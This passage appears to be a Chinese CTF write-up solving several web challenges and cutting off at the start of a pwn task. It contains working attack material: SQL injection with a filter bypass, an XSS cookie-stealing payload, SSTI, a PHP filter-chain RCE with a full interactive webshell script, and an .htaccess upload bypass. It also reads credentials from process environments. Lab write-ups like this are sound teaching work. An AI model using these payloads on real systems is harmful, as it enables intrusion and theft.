      border: 2px solid #111;
      border-left: 0;
      color: #fff;
      background: #111;
      font: inherit;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s;
    }

    button:hover {
      background: #333;
    }

    .notice {
      padding: 16px;
      border: 2px solid #e74c3c;
      background: #fdeaea;
      color: #c0392b;
      font-weight: bold;
      margin-bottom: 24px;
    }

    .products {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      border-top: 2px solid #111;
      border-left: 2px solid #111;
    }

    article {
      display: flex;
      flex-direction: column;
      border-right: 2px solid #111;
      border-bottom: 2px solid #111;
      background: #fff;
      transition: background-color 0.3s ease;
    }

    article:hover {
      background: #fafafa;
    }

    .photo {
      height: 500px;
      display: grid;
      place-items: center;
      padding: 24px;
      background: #f4f4f4;
      border-bottom: 2px solid #111;
      overflow: hidden;
    }

    .photo img {
      display: block;
      width: 100%;
      height: 100%;
      object-fit: contain;
      transition: transform 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94);
    }

    article:hover .photo img {
      transform: scale(1.08);
    }

    .details {
      display: flex;
      flex-direction: column;
      flex-grow: 1;
      padding: 24px;
    }

    h2 {
      margin: 0 0 12px;
      font-size: 18px;
      line-height: 1.3;
      font-weight: 800;
    }

    .details p {
      margin: 0;
      font-size: 14px;
      line-height: 1.6;
      color: #555;
      margin-bottom: 24px;
    }

    .price {
      display: inline-block;
      margin-top: auto;
      font-size: 18px;
      font-weight: 800;
      letter-spacing: .05em;
      color: #111;
    }

    .empty {
      padding: 40px 20px;
      border: 2px solid #111;
      text-align: center;
      font-weight: bold;
      font-size: 18px;
      background: #f9f9f9;
    }

    footer {
      margin-top: 60px;
      padding-top: 24px;
      border-top: 1px solid #e5e5e5;
      font-size: 12px;
      color: #777;
      line-height: 1.8;
      text-align: center;
    }

    @media (max-width: 900px) {
      .products {
        grid-template-columns: repeat(2, 1fr);
      }
    }

    @media (max-width: 600px) {
      .products {
        grid-template-columns: 1fr;
      }
      .photo {
        height: 460px;
      }
      header {
        padding-inline: 16px;
      }
    }
  </style>
</head>

<body>
  <header>
    <a href="shop.php">CHICHIBU<br>LIQUOR STORE</a>
    <span class="bag">BAG (0)</span>
  </header>
  <main>
    <div class="eyebrow">EST. 2026 / CHICHIBU, SAITAMA</div>
    <h1>DrinkDrankDrunk 酒铺</h1>
    <p class="intro">今日精选来自秩父与日本各地的 12 种风味，<a href="https://bgm.tv/blog/364092">商品信息来源</a></p>
    <div class="age-warning">
      <span>法律声明：未成年严禁饮酒！适量饮酒，切勿酒后驾车。</span>
    </div>
    <div class="rule"></div>
    <form method="get">
      <input name="q" value="<?= htmlspecialchars($_GET['q'] ?? '', ENT_QUOTES, 'UTF-8') ?>" placeholder="搜索酒款...">
      <button>搜索</button>
    </form>
    
    <?php if ($error): ?>
      <p class="notice"><?= $error ?></p>
    <?php endif; ?>
    
    <?php if (!$products): ?>
      <p class="empty">没有找到符合条件的酒款。</p>
    <?php else: ?>
      <section class="products">
        <?php foreach ($products as $product): ?>
        <article>
          <div class="photo">
            <?php if ($product['image']): ?>
              <img src="<?= htmlspecialchars($product['image'], ENT_QUOTES, 'UTF-8') ?>" alt="<?= htmlspecialchars($product['name'], ENT_QUOTES, 'UTF-8') ?>">
            <?php endif; ?>
          </div>
          <div class="details">
            <h2><?= htmlspecialchars($product['name'], ENT_QUOTES, 'UTF-8') ?></h2>
            <p><?= htmlspecialchars($product['description'], ENT_QUOTES, 'UTF-8') ?></p>
            <strong class="price"><?= htmlspecialchars($product['price'], ENT_QUOTES, 'UTF-8') ?></strong>
          </div>
        </article>
        <?php endforeach; ?>
      </section>
    <?php endif; ?>

    <footer>
      <p>※ 本站为 CTF 教学练习靶场，不提供任何真实酒类在线销售服务。</p>
      <p>健康饮酒提示：未成年人不得饮酒，孕妇及哺乳期妇女请勿饮酒，过量饮酒有害健康。</p>
    </footer>
  </main>
</body>

</html>
```

这里可以注意到虽然有字符的替换，但是还是可以绕过并进行 SQL 注入。

来到主页测试一下 SQL 注入：

![](https://img.halfcity.top/2026/11/10/c39ba713f74456e3d54856be5514774b.png)

![](https://img.halfcity.top/2026/11/10/b506d1654f1e88ae6832bd35f5c9c13a.png)

响应不同，算是测试通过了。

这里尝试使用联合注入获取基础的信息，注意这里需要部分双击绕过字符替换检查：

![](https://img.halfcity.top/2026/11/10/98833cb036323771b7737ee92e573c2f.png)

发现联合注入可用，这就很好了。

尝试检查所有的表：

![](https://img.halfcity.top/2026/11/10/b5694832779db6a996b3384c36bf2913.png)

尝试读取 flag 表的字段：

![](https://img.halfcity.top/2026/11/10/ee4e31821c9b77c75fdb1b6415903434.png)

尝试读取 flag 字段的值：

![](https://img.halfcity.top/2026/11/10/b99e0fdff3b5e92ee93cde1d591e4b32.png)

```txt
flag{l_I0VE_yUr1-m0Re-thAn_sQIl16f117ad}
```

### 小雷的 vibe coding 之旅 (2)

得到的附件中可以看到服务端的源码：

```py
import os
import re
import secrets
from datetime import datetime, timezone

import jwt
from flask import (Flask, redirect, render_template, render_template_string,
                   request, url_for)

app = Flask(__name__)

ADMIN_PASS = os.environ.get("ADMIN_PASS", secrets.token_hex(16))
USERS = {"admin": ADMIN_PASS}

JWT_SECRET = os.environ.get("JWT_SECRET", secrets.token_hex(32))
VISITORS = {}

messages = []
announcement = "欢迎来到小雷的博客，留言板已开放！"


def make_token(username, role):
    payload = {
        "username": username,
        "role": role,
        "iat": datetime.now(timezone.utc),
    }
    return jwt.encode(payload, JWT_SECRET, algorithm="HS256")


def current_identity():
    token = request.cookies.get("token")
    if not token:
        return None
    try:
        return jwt.decode(token, JWT_SECRET, algorithms=["HS256"])
    except Exception:
        return None


def is_admin():
    data = current_identity()
    return bool(
        data
        and data.get("username") == "admin"
        and data.get("role") == "admin"
    )


def current_visitor():
    data = current_identity()
    if not data:
        return None
    if data.get("role") != "visitor":
        return None
    return data.get("username")


def render_announcement():
    return render_template_string(announcement)


@app.route("/")
def index():
    return render_template("index.html", announcement=render_announcement())


@app.route("/register", methods=["GET", "POST"])
def register():
    error = None
    if request.method == "POST":
        username = request.form.get("username", "").strip()[:20]
        password = request.form.get("password", "")
        if not username or not password:
            error = "用户名和密码不能为空"
        elif username in VISITORS or username in USERS:
            error = "用户名已被占用"
        else:
            VISITORS[username] = password
            return redirect(url_for("login", registered=1))
    return render_template("register.html", error=error)


@app.route("/login", methods=["GET", "POST"])
def login():
    error = None
    if request.method == "POST":
        username = request.form.get("username", "")
        password = request.form.get("password", "")
        if USERS.get(username) == password:
            token = make_token(username, "admin")
            resp = redirect(url_for("admin"))
            resp.set_cookie("token", token, httponly=False)
            return resp
        if VISITORS.get(username) == password:
            token = make_token(username, "visitor")
            resp = redirect(url_for("guestbook"))
            resp.set_cookie("token", token, httponly=False)
            return resp
        error = "用户名或密码错误！"
    if request.args.get("registered"):
        notice = "注册成功，请登录"
    else:
        notice = None
    return render_template("login.html", error=error, notice=notice)


@app.route("/guestbook", methods=["GET", "POST"])
def guestbook():
    if request.method == "POST":
        if is_admin():
            poster = "admin"
        else:
            poster = current_visitor()
        if not poster:
            return redirect(url_for("login"))
        content = request.form.get("content", "")
        content = content.replace("<script", "").replace("</script", "")
        content = re.sub(r"\bon\w+\s*=", "", content)
        if content.strip():
            messages.append({"name": poster, "content": content})
        return redirect(url_for("guestbook"))
    return render_template("guestbook.html", messages=messages)


@app.route("/admin", methods=["GET", "POST"])
def admin():
    global announcement
    if not is_admin():
        return redirect(url_for("login"))
    if request.method == "POST":
        new = request.form.get("announcement", "")
        if new.strip():
            announcement = new
            return redirect(url_for("admin"))
    return render_template(
        "admin.html",
        announcement=render_announcement(),
        announcement_source=announcement,
    )


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)

```

admin 的密码在环境变量中，我们无法直接获取 admin 的密码。

其中 `/guestbook` 这个路由中只有对 XSS 的简单过滤，由于缺乏对 `{{}}` 的过滤，这样会导致 SSTI 漏洞。

不过我们现在还无法访问 admin 界面所以我们先到主页看看。

![](https://img.halfcity.top/2026/11/10/6cb6d57fe5fa8b1eadea2ca35322d799.png)

![](https://img.halfcity.top/2026/11/10/f44e377d9e5e625b261b24fb29179dfc.png)

这里有一个留言板，使用 img 标签测试 XSS 发现直接成功了，这不是过滤了个滚木嘛。

思考一下留言接口没有限制，通过 XSS 可以控制 admin 留下他的 cookie。

payload 如下：

```html
<img src=x OnErRoR="fetch('/guestbook',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'content='+encodeURIComponent(document.cookie)})">
```

输入后等待一下刷新就能看 admin 的 cookie 了：

![](https://img.halfcity.top/2026/11/10/856aa0944c113a3f5dccc119d2e93f88.png)

来到 admin 页面，回想起之前看代码有观察到 SSTI，那么这里其实就是 pyjail 的部分了。

先测测简单的 payload：

![](https://img.halfcity.top/2026/11/10/cf66891e63f527d548613acad6b80661.png)

非常好一遍过了，直接读 flag：

![](https://img.halfcity.top/2026/11/10/9e4da0dd80b41c76f89b76c5277208e7.png)

```txt
flag{MoNIT0RlNG-CR3@TivE-Innov4Ti0N_PlAtf0RM96a}
```

### 大爷模拟器

题目给了附件不过似乎只是启动环境的工具？至少现在似乎没有什么作用，我们先放一放。

来到主页：

![](https://img.halfcity.top/2026/11/10/4eae9a79379b37b97cb53f2d7869a619.png)

非常丑的主页，同时点击 view 可以看到一些梗视频。

另外我们可以注意到 `index.php?page=home` 这里的参数，猜测可能存在 LFI 漏洞。

我们可以测试一下利用 php 的 filter 协议进行利用，期待获取一个 webshell。

这里我将使用[这个工具](https://github.com/synacktiv/php_filter_chain_generator)生成 payload： 

```bash
> python php_filter_chain_generator.py --chain "<?php system($_GET['c']); ?>"
[+] The following gadget chain will generate the following code : <?php system($_GET['c']); ?> (base64 value: PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=index&c=ls ..
```

随后我们就可以测试一下：

![](https://img.halfcity.top/2026/11/10/4a582e6bc825c4a9311461c7f8f5c9b6.png)

可以看到成功利用，并且尾随了一段意义不明的字符串。

由于实例可能不能外连所以我们不能开一个穿透弹 shell 回来，不过我们可以直接写一个非交互式的 webshell：

```py
import requests
import re
import sys
from urllib.parse import quote, urlencode

TARGET = "http://110.42.112.160:20459/index.php"

FILTER_CHAIN = (
    "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|"
    "convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|"
    "convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|"
    "convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|"
    "convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|"
    "convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|"
    "convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|"
    "convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|"
    "convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|"
    "convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|"
    "convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|"
    "convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|"
    "convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|"
    "convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|"
    "convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|"
    "convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|"
    "convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|"
    "convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|"
    "convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|"
    "convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|"
    "convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|"
    "convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|"
    "convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|"
    "convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|"
    "convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|"
    "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|"
    "convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|"
    "convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|"
    "convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|"
    "convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|"
    "convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|"
    "convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|"
    "convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|"
    "convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|"
    "convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|"
    "convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|"
    "convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|"
    "convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|"
    "convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|"
    "convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|"
    "convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|"
    "convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|"
    "convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|"
    "convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|"
    "convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|"
    "convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|"
    "convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|"
    "convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|"
    "convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|"
    "convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|"
    "convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|"
    "convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|"
    "convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|"
    "convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|"
    "convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|"
    "convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|"
    "convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|"
    "convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|"
    "convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|"
    "convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|"
    "convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|"
    "convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|"
    "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|"
    "convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|"
    "convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|"
    "convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|"
    "convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|"
    "convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|"
    "convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|"
    "convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|"
    "convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|"
    "convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|"
    "convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|"
    "convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|"
    "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|"
    "convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|"
    "convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|"
    "convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|"
    "convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=index"
)

_ENCODED_CHAIN = quote(FILTER_CHAIN, safe="")

SESSION = requests.Session()

def run_cmd(cmd: str, timeout: int = 30) -> str:
    """执行命令并返回输出"""
    url = f"{TARGET}?page={_ENCODED_CHAIN}&c={quote(cmd, safe='')}"
    try:
        r = SESSION.get(url, timeout=timeout)
    except requests.RequestException as e:
        return f"[!] 请求失败: {e}"

    body = r.text

    lines = []
    for line in body.splitlines():
        s = line.strip()
        if not s:
            continue
        if s.startswith("Warning:") or s.startswith("Notice:") \
           or s.startswith("Deprecated:") or s.startswith("Fatal error:"):
            continue
        if "<br" in s or "<b>" in s:
            # 去掉 HTML 标签
            s = re.sub(r"<[^>]+>", "", s).strip()
            if not s:
                continue
        lines.append(s)

    lines = lines[:-1]

    return "\n".join(lines) if lines else "[空输出]"


def main():
    out = run_cmd("id")
    print(f"[*] id => {out}\n")

    while True:
        try:
            cmd = input("shell> ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n[*] 退出")
            break

        if not cmd:
            continue
        if cmd.lower() in ("exit", "quit", "q"):
            print("[*] 退出")
            break

        result = run_cmd(cmd)
        print(result)
        print()


if __name__ == "__main__":
    main()
```

不过一番查找我们似乎怎么都找不到 flag 在哪里。

这个时候回忆一下，似乎给的附件我们还没用呢，附件里面有一个 git 仓库我们还没看过。

![](https://img.halfcity.top/2026/11/10/9affbb672e17db937b4fa27f320ba9c2.png)

![](https://img.halfcity.top/2026/11/10/138077f8a9b190d6fca7f1895ef933c5.png)

这里我们就可以明显地看到 docker 脚本中在 FLAG 环境变量存在时候启动了这个程序 `/usr/local/bin/device-agent` 随后将 FLAG 删除。

所以我们可以在这个程序的内存中找到 flag：

```bash
shell> ps -ef | grep device-agent
www-data       7       1  0 02:42 ?        00:00:00 /bin/sh /usr/local/bin/device-agent
www-data     180      22  0 03:13 ?        00:00:00 sh -c -- ps -ef | grep device-agent
www-data     182     180  0 03:13 ?        00:00:00 grep device-agent
shell> cat /proc/7/environ | tr '\0' '\n' | grep FLAG
PHP_LDFLAGS=-Wl,-O1 -pie
PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
FLAG=flag{06d2322d-24dd-73eb-3637-0228e698139b}
```

```txt
flag{06d2322d-24dd-73eb-3637-0228e698139b}
```

### ez_upload

这里说管理员才可以登录，我们看看 cookie 发现 role 中使用 base64 编码了角色字符串：

![](https://img.halfcity.top/2026/11/10/b9f204fff02b26fc4b2331645be479f1.png)我们直接伪造一个：

![](https://img.halfcity.top/2026/11/10/dfefe47ba21d01ccb7aec01d74a6d56b.png)

![](https://img.halfcity.top/2026/11/10/89ee08fad96657e54abf6cbef9e93053.png)

这里似乎不让文件中有 `?`，并且经过测试似乎存在后缀白名单校验。

![](https://img.halfcity.top/2026/11/10/1d69dbceb92e692de1a74b761056959c.png)

![](https://img.halfcity.top/2026/11/10/cc7412790e63acfc55cf3d263ef38eb3.png)

不过我发现 `.htaccess` 文件是可以上传的，同时服务器还是 apache，这样我们就可以控制文件类型的解析，对于内容我们可以尝试使用 script 标签绕过。

文件如下：

```bash
❯ cat poc.jpg
<script language="php">system('cat /flag');</script>

❯ cat .htaccess
SetHandler application/x-httpd-php
```

![](https://img.halfcity.top/2026/11/10/15f0a4715ae25248c93fc2ab67cda484.png)

```txt
flag{y0u_c@n_N0w_up1o@d_@Ny_fi1e}
```

## Pwn

### 未公开手稿

检查一下题目：

```c
void __cdecl printer()
{
  char input[256]; // [rsp+10h] [rbp-1E0h] BYREF
  unsigned __int64 stack_cache[16]; // [rsp+110h] [rbp-E0h] BYREF
  char flag_cache[64]; // [rsp+190h] [rbp-60h] BYREF
  size_t flag_len; // [rsp+1D8h] [rbp-18h]
  const char *flag; // [rsp+1E0h] [rbp-10h]
  size_t i; // [rsp+1E8h] [rbp-8h]

  memset(flag_cache, 0, sizeof(flag_cache));
  stack_cache[0] = 0x1111111111111111LL;
  qmemcpy(&stack_cache[1], "\"\"\"\"\"\"\"\"33333333DDDDDDDDUUUUUUUU", 32);
  stack_cache[5] = 0xAAAAAAAAAAAAAAAALL;
  stack_cache[6] = 0xBBBBBBBBBBBBBBBBLL;
  stack_cache[7] = 0xCCCCCCCCCCCCCCCCLL;
  memset(&stack_cache[8], 0, 64);
  flag = getenv(name: "FLAG");
  if ( flag && *flag )
  {
    flag_len = strlen(s: flag);
    if ( flag_len <= 0x3F )
    {
      memcpy(dest: flag_cache, src: flag, n: flag_len);
      for ( i = 0; i <= 7; ++i )
        stack_cache[i + 8] = *(_QWORD *)&flag_cache[8 * i];
      unsetenv(name: "FLAG");
      flag = 0;
      setvbuf(stream: stdout, buf: 0, modes: 2, n: 0);
      puts(s: asc_402044);
      puts(s: &s_);
      while ( 1 )
      {
        fwrite(ptr: &ptr_, size: 1u, n: 8u, s: stdout);
        if ( !fgets(s: input, n: 256, stream: stdin) )
          break;
        input[strcspn(s: input, reject: "\n")] = 0;
        if ( !strcmp(s1: input, s2: "quit") )
          break;
        if ( input[0] )
        {
          if ( contains_write_conversion(s: input) )
          {
            puts(s: &s__0);
          }
          else
          {
